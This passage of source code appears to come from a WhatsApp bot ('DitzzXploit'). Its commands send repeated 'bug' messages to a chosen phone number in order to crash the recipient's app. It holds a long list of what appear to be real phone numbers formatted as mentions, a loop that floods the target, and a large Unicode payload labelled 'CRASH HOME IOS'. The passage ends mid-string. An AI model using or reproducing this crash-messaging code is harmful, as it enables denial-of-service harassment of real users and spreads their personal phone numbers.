~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*oi.ђạƈќḕṙṠ-ḟḭḲṙḭḭ-ṁṏḉḧḭḶ.io*_~
~_*
*_~`
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await DitzzXploit.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
  await sleep(5000)
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
 await sleep(5000)
DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
await sleep(5000)
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
 await sleep(5000)
DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
await sleep(5000)
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}`}, {quoted: qbug})
 await sleep(5000)
DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss}
${kroco}`}, {quoted: qbug})
await sleep(5000)
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}
${kroco}
${bugss}`}, {quoted: qbug})
 await sleep(5000)
DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss} ${kroco}`}, {quoted: qbug})
await sleep(5000)
  DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss} ${kroco}`}, {quoted: qbug})
 await sleep(5000)
DitzzXploit.sendMessage(prrkek, {text: `Paket Datang Dari ${pushname}

${bugss} ${kroco}`}, {quoted: qbug})
}
//Tambahin sesuai sama lu, biar makin crash
reply(`Succes Send Bug Ke ${prrkek} deangan jumlah ${jumlah}`)
    
}
break
case "sepuhcrash":{
  if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
  let bugss = `📱 𝐂𝐑𝐀𝐒𝐇 𝐇𝐎𝐌𝐄 𝐈𝐎𝐒 🍏ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬